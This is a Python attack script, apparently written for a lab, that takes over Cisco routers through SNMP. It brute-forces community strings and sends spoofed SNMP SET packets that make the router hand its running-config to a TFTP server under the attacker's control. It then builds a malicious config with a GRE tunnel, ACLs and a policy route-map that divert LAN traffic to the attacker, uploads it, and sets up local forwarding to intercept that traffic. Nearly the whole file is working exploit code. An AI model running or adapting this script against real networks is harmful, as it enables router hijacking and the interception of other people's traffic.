#!/usr/bin/python3 
from os import system, environ, popen, kill
from os.path import realpath, dirname
environ['DISPLAY']=':0'
environ['PYTHONPATH']='./'
from pathlib import Path
from filecmp import cmp as file_cmp
from filecmp import clear_cache
from psutil import net_connections
from subprocess import *
from kamene.all import *
from requests import get
from signal import SIGTERM
from ipaddress import ip_network
from ptftplib.tftpserver import TFTPServer
import sys
import nmap
import threading



#   Check if host is up <- DONE
#   Check if host is listening on port  <- DONE
#   Scan port (tcp/udp) <-  DONE
#   Brute communities   <- DONE
#   Once found, snmpwalk and find configs
    #   Networks    <- DONE
        # once found... attempt config download

#   kill off old TFTP servers <- DONE
#   Start up TFTP server <- DONE
#   Verify <- DONE

#   Brute private communites + download config <- DONE

#   Parse config and find availible interfaces (mostly for de-duplication) <- DONE
#   Insert our Tunnel into bad config   <- DONE
#   Parse through availible networks & interfaces   <- DONE
#   Insert Create access-lists including our interesting traffic    <- DONE
#   Insert Create route map <- DONE
#   Insert Route map to interfaces  <- DONE

#   Send bad config down range <- DEBUG

#   Spin-up local tunnel interface  <- DONE
#   Spin-up local packet forwarding <- DONE
#   start sniffing traffic
#   filter for gre tagged traffic
clean = False
debug = 0
CONFIG="./running-config"
RHOST=None          # Global RHOST
RPORT=161           # Global RPORT
T_RHOST="10.0.0.2"  # Tunnel RHOST
T_LHOST="10.0.0.1"  # Tunnel LHOST
LHOST=(popen('ifconfig tap0 | grep -w "inet" | cut -d" " -f10').read()).strip()
for i,x in enumerate(sys.argv):
    if x.lower() in ["-r","--rhost"]:
        RHOST=sys.argv[i+1]
    elif x.lower() in ["-p","--rport"]:
        RPORT=int(sys.argv[i+1])
    elif x.lower() in ["-l","--lhost"]:
        LHOST=sys.argv[i+1]
    elif x.lower() in ["-c","--config"]:
        CONFIG=sys.argv[i+1]
    elif x == "-d":
        debug = 1
    elif x == "-dd":
        debug = 2
    elif x == "--clean":
        clean = True

if RHOST is None:
    sys.stderr.write("[-] RHOST (-r / --rhost) is mandatory!\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] Using RHOST {RHOST} RPORT {RPORT}\n")

if LHOST == '':
    sys.stderr.write("[-] Tap0 not up.  Are you conencted to the lab\n")
    sys.exit(-1)
sys.stdout.write(f"[*] Using LHOST {LHOST}\n")


# ;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Cleanup ;;;;;;;
if clean:
    if debug > 0:
        print("[D] Cleaning up old stuff...")
    os.system("/bin/rm running-config 1>/dev/null 2>&1")
    os.system("/bin/rm running-config.old 1>/dev/null 2>&1")
    os.system("/bin/rm snmpcommunities.lst 1>/dev/null 2>&1")
    os.system("/sbin/modprobe -r ip_gre 1>/dev/null 2>&1")
    os.system("/usr/sbin/iptables -F")

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; INITIAL RECON ;;;;;;;;
# Host detection and service detection
nmap_args = f"-sU -p{RPORT}"
nm = nmap.PortScanner()
nm.scan(hosts=RHOST,arguments=nmap_args)

if nm[RHOST]['status']['state'] not in ['up']:
    sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
    sys.exit(-1)
print(f"[*] {RHOST} appears up")

if nm[RHOST]['udp'][RPORT]['state'] not in ['open','open|filtered']:
    sys.stderr.write(f"[-] Port {RPORT} is not open on rhost {RHOST}\n\n")
    sys.exit(-1)
print(f"[*] {RHOST}:{RPORT} appears open")


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;;;;; SNMP BRUTE ;;;;;;;;;;


# SNMP Community string brute
# Update the SNMP-communities list
list_file = './snmpcommunities.lst'
snmpcommunities = Path(list_file)
if not snmpcommunities.exists():
    sys.stdout.write("[*] Fetching a better list file than what nmap provides by default..\n")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/snmp.txt"
    with open(list_file,"wb") as list_file_fd:
        response = get(url)
        list_file_fd.write(response.content)
    print("[*] List file saved as: ./snmpcommunities.lst")
else:
    print("[*] Looks like an snmpcommunities list is already present...")

"""
# Brute for other public communities
sys.stdout.write("[*] Brute forcing SNMP communities\n")
nmap_args += f" --script=snmp-brute --script-args=snmp-brute.communitiesdb={list_file}"
nm.scan(hosts=RHOST,arguments=nmap_args)
result = nm[RHOST]['udp'][RPORT]['script']['snmp-brute'].strip('\n').split('\n')

communities = []
for k,v in enumerate(result):
    if " Valid credentials" in v.lstrip().split('-')[1]:
        communities.append(v.split('-')[0].rstrip().lstrip())

if len(communities) == 0:
    sys.stderr.write(f"[-] No communities discovered on host {RHOST}:{RPORT}!  \n")
    sys.exit(-1)
sys.stdout.write(f"[+] Found the following community strings: {communities}\n")
"""
# TESTING ONLY
communities = ['public']

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;;; GET NETWORK, SUBNET, INTERFACES ;;;;;;;;


# Getting interfaces and networks
# for use in ACLs

# EXAMPLE: ['FastEthernet0/0', '    IP address: 192.168.102.203  Netmask: 255.255.254.0',
print("[*] Getting interfaces and networks...")
snmp_output = nm.scan(hosts=RHOST,arguments="-sU -p161 --script=snmp-interfaces")
snmp_output = nm[RHOST]['udp'][RPORT]['script']['snmp-interfaces'].lstrip().rstrip().split('\n')

# EXAMPLE:
#   ['FastEthernet0/0', 'IP address: 192.168.102.203  Netmask: 255.255.254.0'...
snmp_output2 = []
for i,x in enumerate(snmp_output):
    snmp_output2.append(x.rstrip().lstrip())

# EXAMPLE:
#{'FastEthernet1/0': ['IP', 'address:', '10.200.2.213', '', 'Netmask:', '255.255.255.0']}
snmp_output3 = {}
for i in range(0,len(snmp_output2)-1):
    if ("FastEthernet" in snmp_output2[i]) or ("GigabitEthernet" in snmp_output2[i]) or ("Ethernet" in snmp_output2[i]):
        if not LHOST or not RHOST in snmp_output2[i+1]:
            snmp_output3[snmp_output2[i]] = snmp_output2[i+1].split(' ')

if debug > 0:
    print(  f"[D] SNMP_OUTPUT: {snmp_output}\n"\
            f"[D] SNMP_OUTPUT2: {snmp_output2}\n"\
            f"[D] SNMP_OUTPUT3: {snmp_output3}\n")

masks = {"255.255.255.255":"0.0.0.0","255.255.255.254":"0.0.0.1",
"255.255.255.252":"0.0.0.3","255.255.255.248":"0.0.0.7",
"255.255.255.240":"0.0.0.15","255.255.255.224":"0.0.0.31",
"255.255.255.192":"0.0.0.63","255.255.255.128":"0.0.0.127",
"255.255.255.0":"0.0.0.255","255.255.254.0":"0.0.1.255",
"255.255.252.0":"0.0.3.255","255.255.248.0":"0.0.7.255",
"255.255.240.0":"0.0.15.255","255.255.224.0":"0.0.31.255",
"255.255.192.0":"0.0.63.255","255.255.128.0":"0.0.127.255",
"255.255.0.0":"0.0.255.255","255.254.0.0":"0.1.255.255",
"255.252.0.0":"0.3.255.255","255.248.0.0":"0.7.255.255",
"255.240.0.0":"0.15.255.255","255.224.0.0":"0.31.255.255",
"255.192.0.0":"0.63.255.255","255.128.0.0":"0.127.255.255",
"255.0.0.0":"0.255.255.255","254.0.0.0":"1.255.255.255",
"252.0.0.0":"3.255.255.255","248.0.0.0":"7.255.255.255",
"240.0.0.0":"15.255.255.255","224.0.0.0":"31.255.255.255",
"192.0.0.0":"63.255.255.255","128.0.0.0":"127.255.255.255",
"0.0.0.0":"255.255.255.255"}

#{'10.200.2.213': '0.0.0.255'}
networks = {}
for k,v in enumerate(snmp_output3):
    pref = snmp_output3[v][2]
    wild = masks[snmp_output3[v][5]]
    sys.stdout.write(f"[*] Using the following network in the ACLs: {pref} {wild}\n")
    networks[snmp_output3[v][2]] = masks[snmp_output3[v][5]]
    if debug > 0:
        print(  f"[D] PREF: {pref}\n"\
                f"[D] WILD: {wild}\n"\
                f"[D] NETWORKS: {networks}\n")

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; Spin-up TFTP server    ;;;;;;;;;; 
# ;;;;;; and check if listening  ;;;;;;;;;

print(f"[*] Spinning up TFTP server on host {LHOST}:69")


iface = 'tap0'
root = './'
os.system(f"atftpd --daemon --bind-address {LHOST} --user root .")

res = ''
pid = ''
pids = []
for k,v in enumerate(net_connections()):
    if 69 == v[3][1]:
        pids.append(str(v[6]))

print("[*] killing off previously existing TFTP servers")
for k,v in enumerate(pids):
    try:
        kill(int(v),SIGTERM)
    except ProcessLookupError:
        continue
    tftp_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
    print("[*] Now starting up our server...")
    os.system(f"/usr/sbin/atftpd --daemon --bind-address {LHOST} --logfile /var/log/atftpd.log --user root {tftp_dir}")

    for k,v in enumerate(net_connections()):
        if f"{LHOST}" == v[3][0]:
            if 69 == v[3][1]:
                res = v[3][0]
                pid = v[6]
    if len(res) == 0:
        sys.stderr.write(f"[-] Host not listening on {LHOST}:69!!!\n")
        sys.exit(-1)
    else:
        print("[*] TFTP Server running")
        if debug > 0:
            print(f"[D] Server info {res} PID={pid}")

    
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; SNMP PRIVATE BRUTE AND ATTEMPT ;;;;;;;;;
# ;;;;;; DOWNLOAD REMOTE RUNNING-CONFIG ;;;;;;;;;
# Sort the internal addresses
spoof_addr = ''
for k,v in enumerate(networks):
    if v != RHOST:
        spoof_addr = v
        break

# Iterate through that .lst file, using the above address for the spoof
running_config = Path("running-config")
i=IP(src=spoof_addr,dst=RHOST)
u=UDP(dport=161)
with open('snmpcommunities.lst','r') as snmp_list:
    print("[*] Brute forcing the private commuinty and attemping config download...")
    while not running_config.exists():
        for k,v in enumerate(snmp_list):
            private_community = v.strip()
            s=SNMP(community=private_community,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.55.{LHOST}"),value="running-config")]))
            
            if debug > 0:
                print(  f"---------------------------------\n"\
                        f"i=IP\n"\
                        f"|- src={spoof_addr}\n"\
                        f"|- dst={RHOST}\n"\
                        f" |- u=UDP\n"\
                        f"  |- dport=161\n"\
                        f"  |- s=SNMP\n"\
                        f"   |- Community = {private_community}\n"\
                        f"   |- PDU\n"\
                        f"    |- ASN1_OID:\n"\
                        f"     |- 1.3.6.1.4.1.9.2.1.55.{LHOST}\n"\
                        f"     |- value = running-config\n"\
                        f"-----------------------------------\n")
            else:
                sys.stdout.write(".")
                sys.stdout.flush()
            
            send(i/u/s,count=1,verbose=0)

            ctr = 0
            found = False
            sys.stdout.write('\n')
            while(ctr < 50):
                if running_config.exists():
                    print(f"\n[+] Private community found [{private_community}] : cisco running-config downloaded")
                    found = True
                    break
                else:
                    sys.stdout.write('.')
                    sys.stdout.flush()
                    ctr+=1
            if found:
                break

            time.sleep(1)
        break


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;; CONFIG BUILD ;;;;;;;;;;;
# Build the new config entries from 
# downloaded config
src_eth = ""
tunnel_name = "interface Tunnel0\n"
tunnel_address = ""
tunnel_source = ""
tunnel_destination = ""

# Obtaining the interface associated with
# RHOST and setting it to tunnel_source
with open(CONFIG,"r") as fd:    
    for line in fd:
        int_eth = "interface FastEthernet"

        # String compare, looking for int_eth
        if int_eth in line[0:23]:

            # we're having to assume a reasonable number of interfaces
            # ... and that there are also only two (x/x) and not (x/x/x) 
            # ...  also keep in mind this is to prevent duplicates
            for i in range(0,11):
                for ii in range(0,11):
                    
                    # rebuild each "interface" name/number
                    src_eth = int_eth
                    src_eth += f"{i}/{ii}"
                    if src_eth in line[0:30]:
                        tmp_fd = fd
                        for tmp_line in tmp_fd:
                            if f" ip address {RHOST}" in tmp_line[0:28]:
                                tunnel_source = f" tunnel source {src_eth[10:]}\n"

# Same thing above, but Tunnel Interface
with open(CONFIG,"r") as fd:
    for line in fd:       
        int_tun = "interface Tunnel"
        if int_tun in line[0:17]:
            for i in range(1,2147483647):
                new_tun = int_tun
                new_tun += str(i)
                if new_tun in line[0:30]:
                    continue
                else:
                    # default
                    tunnel_name = f"{new_tun}\n"
tunnel_address = f" ip address {T_RHOST} 255.255.255.252\n"
tunnel_destination = f" tunnel destination {LHOST}\n"

# Similar style... take what exists and append +1...
# ...otherwise default to 1
acl_num = 0
new_acl = "access-list "
access_list = []
with open(CONFIG,"r") as fd:
    for line in fd: 
        acl = "access-list "
        if acl in line[0:12]:
            for acl_num in range(1,255):
                new_acl = acl
                new_acl += str(acl_num)
                if new_acl in line[0:16]:
                    continue
                else:
                    break
    for index,network in enumerate(networks):
        pref = network
        wild = networks[network]
        access_list.append(f"{new_acl} permit {pref} {wild}\n")

new_map = "route-map "
with open(CONFIG,"r") as fd:
    for line in fd:
        if new_map in line[0:10]:
            for i in range(1,5):
                new_map += str(i)
                if new_map not in line[0:15]:
                    new_map += "permit 10\n"
                    new_map += f" match ip address {acl_num}\n"
                    new_map += f" set ip next-hop {T_LHOST}\n"
                    break
            break
    new_map += f"{acl_num} permit 10\n"
    new_map += f" match ip address {acl_num}\n"
    new_map += f" set ip next-hop {T_LHOST}\n"


private = ''
cfg_line = []
acl_line = []
acl_tmp = 1
cfg_tmp = 0
print(f"[*] Getting actual private string")
with open(CONFIG,"r") as fd:
    for line in fd:
        if "RW" in line:
            cfg_line = line.split(' ')
            break
    
private = cfg_line[2]
if private != '':
    if debug > 0:
        print(f"[D] Setting private to {private}")

tunnel_config = ""
tunnel_config += tunnel_name
tunnel_config += tunnel_address
tunnel_config += tunnel_source
tunnel_config += tunnel_destination

print(  "[*] Using following tunnel configs\n"\
        "----------------------------------\n"\
        f"{tunnel_config}")


print(  "\n[*] Using the following ACLs\n"
        "----------------------------\n")

for k,v in enumerate(access_list):
    sys.stdout.write(f"{v}")


print(  "\n[*] Using the following route map\n"\
        "---------------------------------\n"\
        f"{new_map}\n")

# Drum up the new configuration file
# using our custom configs
old_cfg = ""
with open(CONFIG,"r") as fd:
    for line in fd:
        old_cfg += line
        if debug > 0:
            sys.stderr.flush()
            sys.stderr.write(f"[D][old_cfg] {line}")

# Get's LAN interfaces by  
# filtering interfaces with 
# RHOST or invalid addresses
lan_interfaces = []
for k,v in enumerate(snmp_output3):
    if snmp_output3[v][2] not in ["255.255.255.255",RHOST,T_RHOST,"255.255.255.254","127.0.0.1"]:
        lan_interfaces.append(v)

if debug > 0:
    sys.stderr.flush()
    sys.stderr.write(f"[D] LAN_INTERFACES: {lan_interfaces}\n")
# Iterate over the configs, index by index
new_cfg = ""
for k,v in enumerate(old_cfg.split('\n')):
    
    # Iterate over the lan_interfaces, index by index
    for i,x in enumerate(lan_interfaces):

        if debug > 0:
            sys.stderr.write(f"[D][new_cfg] {v} | X: {x}\n")
            sys.stderr.flush()
        # Should be a string comparison at this point
        # ... append the policy map to the interface
        # ... and then keep on adding rest of configs
        if v.strip() == f"interface {x}":
            new_cfg += f"interface {x}\n"
            new_cfg += f" ip policy route-map {acl_num}\n"
            continue
        elif "end" == v:
            new_cfg += tunnel_config
            new_cfg += "!\n"
            new_cfg += new_map
            new_cfg += "!\n"
            for i,x in enumerate(access_list):
                new_cfg += f"{x}"
            new_cfg += "!\n"
            new_cfg += "end\n"
        else:
            new_cfg += f"{v}\n"


if debug > 0:
    print(  "\n\n--------------------------\n"\
            "------New Configs---------\n"
            "--------------------------\n\n")
    print(new_cfg)
else:
    print(f"[*] New Configuration created!\n")


# Write to file and sanity check
os.rename("running-config","running-config.old")
with open("running-config","w+") as fd:
        fd.write(new_cfg)

lines = 0
with open("running-config","r") as fd:
    for i,x in enumerate(fd):
        lines += 1
if lines < 2:
    sys.stderr.write(f"[-] Error writing new config file (empty file). Aborting..\n")
    sys.exit(-1)

if debug > 0:
    with open("running-config","r") as fd:
        for line in fd:
            print(f"[D] {line}".strip())


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;;;  Setting up cidr  ;;;;;;;;;;
# ;;;;;;;;;  len per wildcard ;;;;;;;;;;
bit_len = {}
nets = []
ii = 32
for i,x in enumerate(masks):
    bit_len[masks[x]] = f"/{ii}"
    ii -= 1
for k,v in enumerate(networks):
    nets.append(str(ip_network(f"{v}{bit_len[networks[v]]}",False)))

if debug > 0:
    print(f"[D] Wildcard converstion: {bit_len}")
    print(f"[D] Using networks in routing update : {nets}")


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; Setup the local tunnel interface ;;;;;
print(  f"[*] Bringing up Tunnel interface\n"\
        f"|--[>] modprobe ip_gre\n"\
        f"|--[>] iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 255;\n"\
        f"|--[>] ip addr add {T_LHOST}/30 dev mynet;\n"\
        f"|--[>] ifconfig mynet up")
for net in nets:
        print(f"|--[>] route add -net {net} dev mynet\n")

system( f"iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE ;"\
        f"iptables --append FORWARD --in-interface mynet -j ACCEPT ;"\
        f"echo 1 > /proc/sys/net/ipv4/ip_forward ;"\
        f"modprobe ip_gre ;"\
        f"iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 225 ;"\
        f"ip addr add {T_LHOST}/30 dev mynet ;"\
        f"ifconfig mynet up" )
for net in nets:
        system(f"route add -net {net} dev mynet")

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;; Launch ;;;;;;;;;;;;

input(  "[*******************************]\n"\
        "[....Please review the above....]\n"\
        "[............settings...........]\n"\
        "[....WEAPON STATUS:    ARMED....]\n"\
        "[....PRESS ENTER TO CONTINUE....]\n"\
        "[*******************************]\n")
print(  "\n\n"\
        ">>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<\n"\
        ">>> [      MISSILE AWAY     ] <<<\n" \
        ">>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<\n")

i=IP(src=spoof_addr,dst=RHOST)
u=UDP(dport=161)
s=SNMP(community=private,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.53.{LHOST}"),value="running-config")]))

if debug > 0:
    print(  f"---------------------------------\n"\
            f"i=IP\n"\
            f"|- src={spoof_addr}\n"\
            f"|- dst={RHOST}\n"\
            f" |- u=UDP\n"\
            f" |- dport=161\n"\
            f" |- s=SNMP\n"\
            f"  |- community = {private}\n"\
            f"  |- PDU\n"\
            f"   |- ASN1_OID:\n"\
            f"    |-----> 1.3.6.1.4.1.9.2.1.53.{LHOST}\n"\
            f"    |-----> value = running-config\n"
            f"----------------------------------\n")

up=False
while not up:
    print("[*] Uploading 'bad' config")
    send(i/u/s,count=10,verbose=0)
 
    with os.popen(f"/bin/ping {T_RHOST} -c3") as proc:
        for k,v in enumerate(proc.read().split('\n')):
            if "bytes from" in v:
                print(v)
                up = True
                break
